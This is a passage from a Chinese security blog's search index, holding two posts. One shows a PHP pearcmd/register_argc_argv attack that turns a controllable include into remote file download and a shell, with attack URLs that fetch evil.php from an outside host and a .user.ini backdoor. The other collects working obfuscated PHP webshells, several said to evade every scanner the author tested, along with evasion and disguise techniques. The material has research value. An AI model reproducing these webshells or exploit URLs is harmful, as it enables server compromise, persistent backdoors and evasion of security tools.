argv,\u4f46\u6ca1\u505a\u51fa\u6765,\u8d5b\u540e\u770b\u4e86\u522b\u4eba\u7684wp\u548c\u603b\u7ed3,\u81ea\u5df1\u4e5f\u6253\u7b97\u5199\u4e00\u4e2a\u5c0f\u7ed3.","title":"registerargcargv\u4e0einclude\u9650\u5236php\u4efb\u610f\u6587\u4ef6\u4e0b\u8f7d\u7684\u5c0f\u7ed3"},{"location":"%E5%AE%89%E5%85%A8/%E5%AE%89%E5%85%A8%E7%A0%94%E7%A9%B6/register_argc_argv%E4%B8%8Einclude%E9%99%90%E5%88%B6php%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD%E7%9A%84%E5%B0%8F%E7%BB%93/#registerargcargv","text":"\u9996\u5148\u4e86\u89e3\u5230\u8fd9\u4e2a\u53c2\u6570\u9ed8\u8ba4\u662fOn\u7684: \u4f46\u662f\u7ecf\u8fc7\u540e\u6765\u6d4b\u8bd5\u53d1\u73b0\u4f46\u51e1\u914d\u7f6e\u4e86php.ini\u7684php\u91cc\u90fd\u4f1a\u663e\u793a\u58f0\u660e\u8be5\u53c2\u6570\u4e3aOff,\u90a3\u4e48\u8fd9\u4e2a\u53c2\u6570\u662f\u7528\u6765\u505a\u4ec0\u4e48\u7684\u5462? \u8fd9\u91cc\u4ecb\u7ecd\u4e86register argc argv\u7684\u4f5c\u7528,\u5f53\u8fd9\u4e2a\u53c2\u6570\u5f00\u542f\u7684\u65f6\u5019,php\u4f1a\u6ce8\u518cargc\u548cargv\u8fd9\u4e2a\u5168\u5c40\u53d8\u91cf,\u5e76\u4e14\u901a\u8fc7\u7b2c\u4e8c\u4e2a\u56fe\u53ef\u77e5\u6211\u4eec\u53ef\u4ee5\u4ece$_SERVER['argv'] \u4e2d\u83b7\u53d6\u5230\u8fd9\u4e9b\u503c. \u8fd9\u91cc\u5c31\u8981\u77e5\u9053php\u4f5c\u4e3a\u4e00\u79cd\u811a\u672c\u8bed\u8a00,\u5f53\u7136\u53ef\u4ee5\u7528\u4e8e\u7f16\u5199\u547d\u4ee4\u884c\u811a\u672c,\u800c\u6211\u4eec\u53ef\u4ee5\u5728\u811a\u672c\u4e2d\u76f4\u63a5\u8bbf\u95ee argv , argv , argc \u8fd9\u4e24\u4e2a\u5168\u5c40\u53d8\u91cf. \u8fd9\u91cc\u5b9e\u9645\u6d4b\u8bd5\u4e0b\u8f7dregister argc argv\u5f00\u542f\u7684\u60c5\u51b5\u4e0b _SERVER['argv']\u4e0e _SERVER['argv']\u4e0e argv\u7684\u503c: <?php var_dump ( $_SERVER [ 'argv' ]); var_Dump ( $argv ); \u7f51\u9875\u7aef\u4e2d: \u547d\u4ee4\u884c\u6a21\u5f0f\u4e0b: \u800c\u5728register argc argv\u5173\u95ed\u7684\u60c5\u51b5\u4e0b,$_SERVER['argv']\u4e0d\u4f1a\u62ff\u5230\u4efb\u4f55\u53d6\u503c","title":"registerargcargv"},{"location":"%E5%AE%89%E5%85%A8/%E5%AE%89%E5%85%A8%E7%A0%94%E7%A9%B6/register_argc_argv%E4%B8%8Einclude%E9%99%90%E5%88%B6php%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD%E7%9A%84%E5%B0%8F%E7%BB%93/#pear","text":"\u63a5\u4e0b\u6765\u5c31\u8981\u4ecb\u7ecdpear\u8fd9\u4e2a\u547d\u4ee4,\u7b80\u4ecb\u5982\u4e0b:","title":"pear"},{"location":"%E5%AE%89%E5%85%A8/%E5%AE%89%E5%85%A8%E7%A0%94%E7%A9%B6/register_argc_argv%E4%B8%8Einclude%E9%99%90%E5%88%B6php%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD%E7%9A%84%E5%B0%8F%E7%BB%93/#pear_1","text":"Pear \u662f PHP \u6269\u5c55\u4e0e\u5e94\u7528\u5e93\uff08the PHP Extension and Application Repository\uff09\u7684\u7f29\u5199\uff0c\u662f\u4e00\u4e2a PHP \u6269\u5c55\u53ca\u5e94\u7528\u7684\u4e00\u4e2a\u4ee3\u7801\u4ed3\u5e93\u3002Pear \u4ed3\u5e93\u4ee3\u7801\u662f\u4ee5\u5305\uff08package\uff09\u5206\u533a\uff0c\u6bcf\u4e00\u4e2a Pear package \u90fd\u662f\u4e00\u4e2a\u72ec\u7acb\u7684\u9879\u76ee\u6709\u7740\u81ea\u5df1\u72ec\u7acb\u7684\u5f00\u53d1\u56e2\u961f\u3001\u7248\u672c\u63a7\u5236\u3001\u6587\u6863\u548c\u5176\u4ed6\u5305\u7684\u4f9d\u8d56\u5173\u7cfb\u4fe1\u606f\u3002Pear package \u4ee5 phar\u3001tar \u6216 zip \u53d1\u5e03\u3002 \u65e2\u7136\u662f\u4e2a\u5305\u7ba1\u7406\u5668,\u90a3\u4e48\u5c31\u5e94\u8be5\u5b58\u5728\u4e0b\u8f7d\u548c\u5b89\u88c5\u5305\u7684\u529f\u80fd,\u90a3\u4e48pear\u547d\u4ee4\u662f\u5982\u4f55\u5b9e\u73b0\u7684\u5462? \u5b9e\u9645\u4e0apear\u547d\u4ee4\u662fsh\u811a\u672c,\u6e90\u7801\u5982\u4e0b: #!/bin/sh # first find which PHP binary to use if test \"x $PHP_PEAR_PHP_BIN \" ! = \"x\" ; then PHP = \" $PHP_PEAR_PHP_BIN \" else if test \"/usr/local/bin/php\" = '@' php_bin '@' ; then PHP = php else PHP = \"/usr/local/bin/php\" fi fi # then look for the right pear include dir if test \"x $PHP_PEAR_INSTALL_DIR \" ! = \"x\" ; then INCDIR = $PHP_PEAR_INSTALL_DIR INCARG = \"-d include_path= $PHP_PEAR_INSTALL_DIR \" else if test \"/usr/local/lib/php\" = '@' php_dir '@' ; then INCDIR = ` dirname $0 ` INCARG = \"\" else INCDIR = \"/usr/local/lib/php\" INCARG = \"-d include_path=/usr/local/lib/php\" fi fi exec $PHP -C -q $INCARG -d date.timezone = UTC -d output_buffering = 1 -d variables_order = EGPCS -d open_basedir = \"\" -d safe_mode = 0 -d register_argc_argv = \"On\" -d auto_prepend_file = \"\" -d auto_append_file = \"\" $INCDIR /pearcmd.php \" $@ \" \u901a\u8fc7\u770b\u6700\u540e\u4e00\u884c\u53ef\u4ee5\u77e5\u9053\u5176\u5b9e\u5b83\u662f\u901a\u8fc7php\u8c03\u7528\u4e86pearcmd.php,\u90a3\u4e48pearcmd.php\u4e2d$argv\u662f\u4ece\u54ea\u91cc\u6765\u7684\u5462,\u901a\u8fc7\u7b80\u5355\u67e5\u627e\u53ef\u4ee5\u770b\u5230\u5176\u8c03\u7528\u4e86\u53e6\u4e00\u4e2aphp\u6587\u4ef6\u4e2d\u67d0\u4e2a\u7c7b\u65b9\u6cd5: require_once 'Console/Getopt.php'; /* ... */ $argv = Console_Getopt::readPHPArgv(); \u518d\u6b21\u8ddf\u8fdbConsole/Getopt.php,\u627e\u5230\u8be5\u65b9\u6cd5\u7684\u5b9e\u73b0: public static function readPHPArgv() { global $argv; if (!is_array($argv)) { if (!@is_array($_SERVER['argv'])) { if (!@is_array($GLOBALS['HTTP_SERVER_VARS']['argv'])) { $msg = \"Could not read cmd args (register_argc_argv=Off?)\"; return PEAR::raiseError(\"Console_Getopt: \" . $msg); } return $GLOBALS['HTTP_SERVER_VARS']['argv']; } return $_SERVER['argv']; } return $argv; } \u53ef\u4ee5\u770b\u5230\u83b7\u53d6$argv\u7684\u65b9\u5f0f\u662f global $argv --> $_SERVER['argv'] --> $GLOBALS['HTTP_SERVER_VARS']['argv'] \u540c\u65f6\u6211\u4eec\u77e5\u9053\u5f53\u6211\u4eecinclude\u4e00\u4e2a\u53ef\u4ee5\u88abphp\u89e3\u6790\u7684\u6587\u4ef6\u7684\u65f6\u5019,php\u4ee3\u7801\u4f1a\u88ab\u81ea\u52a8\u6267\u884c,\u8fd9\u6837\u5728register argc argv\u5f00\u542f\u7684\u60c5\u51b5\u4e0b\u6211\u4eec\u5c31\u6709\u53ef\u80fd\u901a\u8fc7\u5305\u542bpearcmd.php\u4e0e\u64cd\u63a7$_SERVER['argv']\u6765\u6267\u884cpear\u547d\u4ee4","title":"pear"},{"location":"%E5%AE%89%E5%85%A8/%E5%AE%89%E5%85%A8%E7%A0%94%E7%A9%B6/register_argc_argv%E4%B8%8Einclude%E9%99%90%E5%88%B6php%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD%E7%9A%84%E5%B0%8F%E7%BB%93/#pear\u547d\u4ee4\u4efb\u610f\u6587\u4ef6\u4e0b\u8f7d","text":"\u6211\u4eec\u5148\u6765\u770b\u770b\u5982\u4f55\u901a\u8fc7pear\u547d\u4ee4\u6765\u5b9e\u73b0\u4efb\u610f\u6587\u4ef6\u4e0b\u8f7d: \u5728\u76ee\u5f55\u4e0b\u521b\u5efa\u4e00\u4e2atmp.php \u4f7f\u7528python\u4e00\u53e5\u8bdd\u5f00\u542fhttp\u670d\u52a1\u5668: python -m SimpleHTTPServer 8080 \u901a\u8fc7\u6267\u884c pear \u547d\u4ee4\u83b7\u53d6\u5e2e\u52a9,\u53d1\u73b0\u5b58\u5728download\u9009\u9879,\u5c1d\u8bd5\u6267\u884c pear download http://127.0.0.1:8080/tmp.php ,\u53ef\u4ee5\u770b\u5230\u5df2\u7ecf\u6210\u529f\u5728\u5f53\u524d\u76ee\u5f55\u4e0b\u8f7d\u4e86tmp.php: \u6709\u6ca1\u6709\u529e\u6cd5\u63a7\u5236\u4e0b\u8f7d\u76ee\u5f55?\u7b54\u6848\u662f\u4f7f\u7528install -R\u800c\u975edownload,\u5c1d\u8bd5\u6267\u884c pear install -R /var/www/html http://127.0.0.1:8080/tmp.php \u6210\u529f\u4e0b\u8f7d\u5230web\u76ee\u5f55\u4e0b\u5e76\u80fd\u591f\u8bbf\u95ee","title":"pear\u547d\u4ee4\u4efb\u610f\u6587\u4ef6\u4e0b\u8f7d"},{"location":"%E5%AE%89%E5%85%A8/%E5%AE%89%E5%85%A8%E7%A0%94%E7%A9%B6/register_argc_argv%E4%B8%8Einclude%E9%99%90%E5%88%B6php%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD%E7%9A%84%E5%B0%8F%E7%BB%93/#\u5982\u4f55\u63a7\u5236_serverargv","text":"\u5982\u4f55\u5f80$_SERVER['argv']\u4f20\u51652\u4e2a\u6216\u4ee5\u4e0a\u7684\u53c2\u6570?\u6d4b\u8bd5\u4e00\u4e0b: \u5e76\u4e0d\u80fd\u901a\u8fc7&\u4f5c\u4e3a$_SERVER['argv']\u7684\u5206\u5272,\u901a\u8fc7\u67e5\u9605\u8d44\u6599\u548c\u9605\u8bfb\u6e90\u7801: main/php_variables.c PHPAPI void php_build_argv ( const char * s , zval * track_vars_array ) { zval arr , argc , tmp ; int count = 0 ; if ( ! ( SG ( request_info ). argc || track_vars_array )) { return ; } array_init ( & arr ); /* Prepare argv */ if ( SG ( request_info ). argc ) { /* are we in cli sapi? */ int i ; for ( i = 0 ; i < SG ( request_info ). argc ; i ++ ) { ZVAL_STRING ( & tmp , SG ( request_info ). argv [ i ]); if ( zend_hash_next_index_insert ( Z_ARRVAL ( arr ), & tmp ) == NULL ) { zend_string_efree ( Z_STR ( tmp )); } } } else if ( s && * s ) { while ( 1 ) { const char * space = strchr ( s , '+' ); /* auto-type */ ZVAL_STRINGL ( & tmp , s , space ? space - s : strlen ( s )); count ++ ; if ( zend_hash_next_index_insert ( Z_ARRVAL ( arr ), & tmp ) == NULL ) { zend_string_efree ( Z_STR ( tmp )); } if ( ! space ) { break ; } s = space + 1 ; } } \u53ef\u4ee5\u77e5\u9053argv\u901a\u8fc7query_string\u53d6\u503c,\u5e76\u901a\u8fc7+\u4f5c\u4e3a\u5206\u5272\u7b26,\u5c1d\u8bd5\u4e00\u4e0b:","title":"\u5982\u4f55\u63a7\u5236$_SERVER['argv']"},{"location":"%E5%AE%89%E5%85%A8/%E5%AE%89%E5%85%A8%E7%A0%94%E7%A9%B6/register_argc_argv%E4%B8%8Einclude%E9%99%90%E5%88%B6php%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD%E7%9A%84%E5%B0%8F%E7%BB%93/#\u56de\u5230\u9898\u76ee","text":"\u73b0\u5728\u56de\u5230\u9898\u76ee,\u6211\u4eec\u6240\u6709\u7684\u62fc\u56fe\u5df2\u7ecf\u51d1\u9f50\u4e86,\u5047\u5982\u5b58\u5728\u4ee5\u4e0b\u73af\u5883: \u5b89\u88c5\u4e86pear \u5f00\u542f\u4e86register argc argv \u5b58\u5728\u53ef\u63a7\u7684 include $_GET['f'] (\u5373\u4f7f\u662f include $_GET['f'].php ) \u90a3\u4e48\u6211\u4eec\u5c31\u53ef\u4ee5\u901a\u8fc7\u4e0a\u9762\u7684\u77e5\u8bc6\u5b9e\u73b0\u4efb\u610f\u6587\u4ef6\u4e0b\u8f7d\u4ece\u800cgetshell: // web\u76ee\u5f55\u53ef\u5199 - http://ip:port/include.php?f=pearcmd&+install+-R+/var/www/html+http://ip:port/evil.php - http://ip:port/tmp/pear/download/evil.php // tmp\u76ee\u5f55\u53ef\u5199 - http://ip:port/include.php?f=pearcmd&+install+-R+/tmp+http://ip:port/evil.php - http://ip:port/include.php?f=/tmp/pear/download/evil","title":"\u56de\u5230\u9898\u76ee"},{"location":"%E5%AE%89%E5%85%A8/%E5%AE%89%E5%85%A8%E7%A0%94%E7%A9%B6/register_argc_argv%E4%B8%8Einclude%E9%99%90%E5%88%B6php%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD%E7%9A%84%E5%B0%8F%E7%BB%93/#\u540e\u95e8","text":"\u524d\u9762\u63d0\u5230register argc argv\u662fPHP INI PERDIR\u7684,\u6240\u4ee5\u6211\u4eec\u53ef\u4ee5\u901a\u8fc7\u65b0\u5efa\u4e00\u4e2a.user.ini\u8bbe\u7f6eregister argc argv\u4e3aOn\u7528\u4e8e\u7559\u540e\u95e8","title":"\u540e\u95e8"},{"location":"%E5%AE%89%E5%85%A8/%E5%AE%89%E5%85%A8%E7%A0%94%E7%A9%B6/register_argc_argv%E4%B8%8Einclude%E9%99%90%E5%88%B6php%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD%E7%9A%84%E5%B0%8F%E7%BB%93/#\u6700\u540edocker","text":"\u5728php\u5b98\u65b9\u63d0\u4f9b\u7684\u955c\u50cf\u4e0b,\u9ed8\u8ba4\u662f\u4e0d\u4f7f\u7528php.ini\u7684(\u5728/usr/local/etc/php\u4e2d\u5b58\u5728php.ini-production\u548cphp.ini-development,\u9700\u8981\u624b\u52a8\u4fee\u6539\u4efb\u610f\u4e00\u4e2a\u6587\u4ef6\u540d\u4e3aphp.ini\u624d\u4f1a\u542f\u52a8php.ini,\u800c\u4e0a\u9762\u6211\u4eec\u63d0\u5230\u5728php.ini\u4e2dregister argc argv\u90fd\u8bbe\u7f6e\u4e3aOff) \u800cregister argc argv\u5728\u4e0d\u8bbe\u7f6e\u7684\u60c5\u51b5\u4e0b\u9ed8\u8ba4\u4e3aOn,\u90a3\u4e48\u5047\u5982\u6709\u4e00\u4e2a\u9ed8\u8ba4\u7684docker-php\u73af\u5883,\u5e76\u5b58\u5728\u53ef\u63a7\u7684 include $_GET['f'] (\u5373\u4f7f\u662finclude $_GET['f'].php),\u6211\u4eec\u5c31\u53ef\u4ee5\u5229\u7528\u8fd9\u4e2a\u6f0f\u6d1e\u5b9e\u73b0getshell","title":"\u6700\u540e:docker"},{"location":"%E5%AE%89%E5%85%A8/%E5%AE%89%E5%85%A8%E7%A0%94%E7%A9%B6/webshell%E5%85%8D%E6%9D%80%E6%80%BB%E7%BB%93/","text":"webshell\u514d\u6740\u603b\u7ed3 # \u4ee5\u4e0b\u5185\u5bb9\u57fa\u4e8ePHP7 \u6700\u8fd1\u5bf9webshell\u7684\u514d\u6740\u673a\u5236\u4ea7\u751f\u4e86\u6d53\u539a\u7684\u5174\u8da3,\u4e8e\u662f\u5f00\u59cb\u8fdb\u884c\u7814\u7a76,\u53c2\u8003\u4e86\u7f51\u4e0a\u8bb8\u8bb8\u591a\u591a\u7684\u6587\u7ae0,\u4ee5\u4e0b\u662f\u6211\u5bf9webshell\u514d\u6740\u7684\u4e00\u4e9b\u603b\u7ed3 \u4f7f\u7528\u4ee5\u4e0b\u7f51\u7ad9\u53ca\u514d\u6740\u5de5\u5177\u8fdb\u884c\u514d\u6740\u6d4b\u8bd5(\u5e26\u661f\u53f7\u7684\u8868\u793a\u6211\u8ba4\u4e3a\u68c0\u6d4b\u6548\u679c\u6bd4\u8f83\u597d\u7684\u5de5\u5177/\u7f51\u7ad9): webshellchop \u957f\u4ead(*) \u6df1\u5ea6\u5b66\u4e60 WEBDIR+ \u767e\u5ea6(*) \u6cb3\u9a6c\u5728\u7ebf\u67e5\u6740 D\u76fe \u5b89\u5168\u72d7 \u53c2\u8003\u6587\u7ae0: https://www.freebuf.com/articles/web/155891.html https://bbs.symbo1.com/t/topic/94 https://www.leavesongs.com/PENETRATION/php-callback-backdoor.html https://xz.aliyun.com/t/5152 http://webshell.cdxy.me/ \u4e0b\u7684\u8bc4\u8bba ... \u514d\u6740\u6280\u672f\u57fa\u7840 # \u524d\u8a00 # \u5bf9\u4e8ewebshell\u7684\u514d\u6740\u800c\u8a00,PHP5\u4e0ePHP7\u6709\u5f88\u5927\u7684\u4e0d\u540c,\u5728PHP7\u4e4b\u540e,assert\u8fd9\u4e2a\u9a6c\u513f\u5e38\u7528\u7684\u51fd\u6570\u53d8\u6210\u4e86\u4e00\u79cd\u7c7b\u4f3c\u4e8eeval\u7684\u8bed\u6cd5\u6784\u9020,\u8fd9\u4f7f\u5f97\u6211\u4eec\u65e0\u6cd5\u901a\u8fc7\u52a8\u6001\u51fd\u6570\u7684\u65b9\u5f0f\u6765\u8c03\u7528assert,\u8fd9\u65e0\u7591\u662f\u5bf9\u514d\u6740\u7684\u4e00\u6b21\u6c89\u91cd\u6253\u51fb.(\u7ecf\u8fc7\u4e25\u683c\u6d4b\u8bd5,\u5728PHP7.0.33\u4e2d\u4f9d\u7136\u53ef\u4ee5,\u731c\u6d4b\u5e94\u8be5\u662fPHP7.1\u4ee5\u540e),\u56e0\u6b64\u6211\u4eec\u9700\u8981\u8f6c\u53d8\u601d\u8def\u4e86.\u6807\u6709(ALLKILL)\u5b57\u6837\u7684webshell\u901a\u8fc7\u4e86\u672c\u6587\u63d0\u5230\u7684\u6240\u6709\u67e5\u6740 \u53e6\u7c7b\u7684\u5165\u53e3 # \u6211\u4eec\u5e38\u89c1\u7684webshell\u5165\u53e3\u90fd\u662f GET, POST\u4e4b\u7c7b\u7684,\u4f46\u662f\u5176\u5b9e\u4e00\u5207\u7684\u5165\u53e3\u6211\u4eec\u90fd\u53ef\u4ee5\u8fdb\u884c\u5229\u7528,\u4ee5\u6b64\u6765\u9003\u8fc7\u67e5\u6740: $_GET $_POST $_COOKIE $_REQUEST $ SERVER \u5176\u4e2d\u7684\u67d0\u4e9b\u53c2\u6570\u53ef\u63a7,\u5982REQUEST METHOD,QUERY STRING,HTTP USER_AGENT\u7b49 session_id() \u8fd9\u4e2a\u6bd4\u8f83\u7279\u6b8a,\u4f46\u662f\u4f9d\u7136\u53ef\u4ee5\u5229\u7528 $_FILE $GLOBALS getallheaders() get defined vars() get defined functions() \u4e0b\u9762\u4e3e\u51e0\u4e2a\u4f8b\u5b50: <?php @ eval ( urldecode ( $_FILES [ 'file' ][ 'name' ])); // \u8be5\u9a6c\u4f1a\u628a\u53cc\u5f15\u53f7\u7ed9URL\u7f16\u7801, // \u56e0\u6b64\u5982\u679cpayload\u4e2d\u6709\u53cc\u5f15\u53f7\u5219\u9700\u8981\u5957\u4e00\u5c42urldecode @ eval ( urldecode ( $_FILES [ 'file' ][ 'type' ])); // \u8be5p\u9a6c\u4f1a\u628a\u5206\u53f7\u5403\u6389,\u56e0\u6b64\u9700\u8981\u5bf9\u5206\u53f7\u8fdb\u884c\u7f16\u7801\u5982URL\u7f16\u7801(%3B) //\u56e0\u6b64\u9700\u8981\u5957\u4e00\u5c42urldecode ?> <?php @ eval ( hex2bin ( $_SERVER [ 'REQUEST_METHOD' ])); // \u8be5\u9a6c\u901a\u8fc7\u8bbe\u7f6e\u8bf7\u6c42\u65b9\u5f0f\u6765\u5b9e\u73b0\u6267\u884c,\u7531\u4e8e\u7b26\u53f7\u95ee\u9898 // \u9700\u8981\u7528bin2hex\u5bf9payload\u8fdb\u884c\u7f16\u7801 ?> <?php $a = $_SERVER [ 'QUERY_STRING' ]; //\u4f8b\u5b50 ?php=info()& $a = str_replace ( \"&\" , \";\" , $a ); $a = str_replace ( \"=\" , \"\" , $a ); @ eval ( $a ); ?> <?php @ eval ( getallheaders ()[ 'Referer' ]); <?php // (ALLKILL) error_reporting ( 0 ); eval ( null . implode ( reset ( get_defined_vars ()))); // php>=5.5 ?a=echo 1; ?> <?php // (ALLKILL) error_reporting ( 0 ); define ( \"SS\" , \"session_start\" ); function result ( $arg ) { return 1 > 0 ? @ $arg : 0 ; } function hex22bin ( $data ) { $len = strlen ( $data ); return pack ( \"H\" . $len , $data ); } class deal { function combine_var ( $default = NULL ){ if ( ! constant ( \"SS\" )) { return $default ; } if ( ! preg_match ( '/\\w+/' , $this -> sess )) { throw new Exception ( \" $this->sess error\" ); } $results = null ; //trash $results = result ( $this -> sess ); @ eval ( \" $this->sess \" ); // PHP>=5.4 // Cookie: PHPSESSID=706870696e666f28293b == phpinfo(); hex2bin(\"phpinfo();\") => 706870696e666f28293b } function __construct ( $arg ){ $this -> sess = $arg ; return $this -> combine_var (); } } $son = constant ( \"SS\" ); $son (); $sessionid = session_id (); $sessionid = hex22bin ( $sessionid ); $deals = new deal ( $sessionid ); ?> \u5176\u4e2d\u6bd4\u8f83\u503c\u5f97\u6ce8\u610f\u7684\u662fGLOBALS,get defined vars(),getallheaders() GLOBALS,get defined vars(): \u4e00\u4e2a\u662f\u8d85\u5168\u5c40\u53d8\u91cf,\u4e00\u4e2a\u662f\u51fd\u6570,\u8fd4\u56de\u503c\u90fd\u662f\u4e00\u4e2a\u591a\u7ef4\u6570\u7ec4,\u5305\u542b\u4e86 GET, POST\u7b49\u5176\u4ed6\u8d85\u5168\u5c40\u53d8\u91cf,\u53ef\u4ee5\u501f\u6b64\u6765\u5bf9\u88f8\u9732\u7684\u8f93\u5165\u8fdb\u884c\u5d4c\u5957,\u5982\u7528GLOBALS[' POST'][1]\u4ee3\u66ff POST[1] getallheaders(): \u83b7\u53d6\u6240\u6709\u7684\u8bf7\u6c42\u5934(\u8be5\u51fd\u6570\u62e5\u6709\u4e00\u4e9b\u9650\u5236,\u5177\u4f53\u8bf7\u53c2\u7167 \u8fd9\u91cc ) \u540c\u6837\u53ef\u4ee5\u501f\u6b64\u6765\u5c1d\u8bd5\u9003\u8fc7\u5bf9\u8f93\u5165\u7684\u68c0\u67e5 \u8fd9\u91cc\u518d\u8bf4\u51e0\u4e2aPHP\u7684\u51fd\u6570 pos(),current(),reset():\u8fd9\u4e09\u4e2a\u51fd\u6570\u7684\u8fd4\u56de\u503c\u90fd\u662f\u4f20\u5165\u6570\u7ec4\u7684\u4e00\u4e2a\u5143\u7d20 next():\u8fd9\u4e2a\u51fd\u6570\u7684\u8fd4\u56de\u503c\u662f\u4f20\u5165\u6570\u7ec4\u7684\u7b2c\u4e8c\u4e2a\u5143\u7d20 end():\u8fd9\u4e2a\u51fd\u6570\u7684\u8fd4\u56de\u503c\u662f\u4f20\u5165\u6570\u7ec4\u7684\u6700\u540e\u4e00\u4e2a\u5143\u7d20 implode():\u53ef\u4ee5\u5c06\u6570\u7ec4\u4e2d\u7684\u5143\u7d20\u62fc\u63a5\u8d77\u6765,\u5982\u62fc\u63a5\u6210\u5b57\u7b26\u4e32 \u53ef\u4ee5\u770b\u5230 evil5.php \u4e2d\u6211\u4eec\u4ec5\u4ec5\u5bf9\u8f93\u5165\u8fdb\u884c\u5904\u7406,\u62fc\u63a5null\u5c31\u8eb2\u8fc7\u4e86\u6240\u6709\u7684\u67e5\u6740. \u9664\u4e86\u4e0a\u8ff0\u65b9\u6cd5\u4e4b\u5916,\u6211\u4eec\u4e5f\u53ef\u4ee5\u5c1d\u8bd5\u4ece\u4e0d\u540c\u7684\"\u95e8\"\u8fdb\u5165,\u5982\u6267\u884c\u7cfb\u7edf\u547d\u4ee4: system() exec() shell_exec() passthru() proc_open() `` // \u53cd\u5f15\u53f7\u6267\u884c\u7cfb\u7edf\u547d\u4ee4 \u6216\u8005\u4f7f\u7528\u4e00\u4e9b\u533f\u540d\u51fd\u6570,\u52a8\u6001\u8c03\u7528\u51fd\u6570,\u56de\u8c03\u51fd\u6570: call user func call user func_array array_filter array_map uasort, uksort array_reduce array_udiff array_walk array walk recursive preg replace, mb ereg_replace preg_filter register shutdown function register tick function filter_var filter var array \u7c7b\u7684\u53cd\u5c04->invoke() include file get contents create function // \u6211\u5c1d\u8bd5\u7528create function\u6765\u521b\u9020\u514d\u6740webshell,\u4f46\u4f3c\u4e4e\u603b\u662f\u7ed5\u4e0d\u8fc7\u957f\u4ead <?php // (ALLKILL) error_reporting ( 0 ); function compare_by_area ( $a , $b ) { $areaA = substr ( $a -> width . $a -> height , 4 ); $areaB = substr ( $b -> width . $b -> height , 4 ); if ( $areaA ( $areaB )) { return - 1 ; } elseif ( $areaA == $areaB ) { return 1 ; } else { return 0 ; } } $array1 = array ( new stdclass ); $array1 [ 0 ] -> width = 'code' ; $array1 [ 0 ] -> height = 'sys' . 'tem' ; $array2 = array ( new stdclass ); $array2 [ 0 ] -> width = 'args' ; $array2 [ 0 ] -> height = pos ( next ( $GLOBALS )); array_udiff ( $array1 , $array2 , 'compare_by_area' ); // PHP >=5.3 \u603b\u7684\u6765\u8bf4,\u5165\u53e3\u5343\u4e07\u6761,\u5b89\u5168\u7b2c\u4e00\u6761,\u514d\u6740\u4e0d\u5230\u4f4d,\u9762\u58c1\u7a7a\u6d41\u6cea.\u5404\u4f4d\u5e08\u5085\u4eec\u53ef\u4ee5\u81ea\u884c\u6d4b\u8bd5\u4e0b\u8fd9\u4e9b\u5165\u53e3 \u53d8\u5f62\u4e0e\u4f2a\u88c5 # \u53d8\u5f62\u53ef\u80fd\u662f\u6211\u4eec\u6700\u5e38\u89c1\u7684bypass\u624b\u6bb5\u4e86,\u4f46\u4ecd\u7136\u662f\u6211\u4eec\u901a\u8fc7\u52a8\u6001\u68c0\u6d4b\u7684\u597d\u624b\u6bb5,PHP\u4e2d\u81ea\u5e26\u4e86\u5927\u91cf\u5bf9\u5b57\u7b26\u4e32\u8fdb\u884c\u5904\u7406\u53d8\u5f62\u4e0e\u7f16\u7801\u7684\u51fd\u6570,\u6211\u4eec\u53ef\u4ee5\u501f\u6b64\u5bf9\u6211\u4eec\u7684webshell\u8fdb\u884c\u64cd\u4f5c \u4ee5\u4e0b\u662f\u4e00\u4e9bPHP\u81ea\u5e26\u7684\u51fd\u6570: substr_replace substr strtr str_rot13 base64_encode chr bin2hex strrev urlencode json_encode pack gzcompress/gzdeflate/gzencode ... \u53e6\u5916\u6211\u4eec\u8fd8\u53ef\u4ee5\u901a\u8fc7\u5341\u516d\u8fdb\u5236/\u516b\u8fdb\u5236\u7f16\u7801,\u53d6\u53cd\uff0c\u5f02\u6216\uff0c\u52a0\u5bc6\uff0c\u5e8f\u5217\u5316,\u51fd\u6570\u540d\u5927\u5c0f\u5199\u7b49\u7b49\u6765\u5bf9webshell\u8fdb\u884c\u53d8\u5f62,\u4f8b\u5982\u5229\u7528\u5341\u516d\u8fdb\u5236\u4e0e\u516b\u8fdb\u5236\u6df7\u7f16\u7684ALLKILL webshell: <?php // (ALLKILL) \u53c2\u8003https://www.freebuf.com/articles/web/155891.html\u4e2d\u8fdb\u5236\u8f6c\u6362\u65b9\u5f0f $v230c590 = \" \\x62\\x61\\163\\x65\\x36\\x34\\137\\144\\145\\x63\\x6f\\144\\145 \" ; @ eval ( '' . $v230c590 ( null . next ( post ( $GLOBALS )); \u53c8\u5982\u5229\u7528\u9762\u5411\u5bf9\u8c61\u7279\u6027,\u5b57\u7b26\u62fc\u63a5,\u52a8\u6001\u8c03\u7528\u53d8\u5f62\u7684ALLKILL webshell: <?php // (ALLKILL) $name = basename ( __FILE__ ); class combine { function __construct ( $var , $srcname ) { $this -> var = $var ; $this -> name = $srcname ; $this -> cookie = get_class ( $this ); $this -> cookie = $this -> cookie [ 2 ]; } function __combine ( $yum ) { $run = $this -> var ; $run .= $this -> name [ 3 ]; $run .= 'e' . $this -> cookie ; $this -> yum = $yum ; $run ( '' . $this -> yum ); } } $result = new combine ( 'sys' , $name ); // php5 php7 success die ( $result -> __combine ( $_GET [ 2333 ])); \u4f2a\u88c5\u5219\u662f\u4e00\u79cd\u6709\u6548\u901a\u8fc7\u9759\u6001\u68c0\u6d4b\u7684\u65b9\u6cd5(\u867d\u7136\u6709\u70b9\u7384\u5b66,\u4f8b\u5982D\u76fe\u4f3c\u4e4e\u6709\u5bf9\u6587\u4ef6\u884c\u6570\u8fdb\u884c\u5224\u65ad),\u6211\u4eec\u5c06webshell\u4f2a\u88c5\u6210\u4e00\u4e2a\u6b63\u5e38\u7684\u529f\u80fd,\u5e76\u914d\u4e0a\u63a9\u4eba\u8033\u76ee\u7684\u540d\u5b57,\u751a\u81f3\u53ef\u4ee5\u9003\u8fc7\u7ba1\u7406\u5458\u7684\u68c0\u67e5,\u4f8b\u5982\u4e0b\u9762\u51e0\u4e2a\u4f8b\u5b50: <?php /** * new plugin * 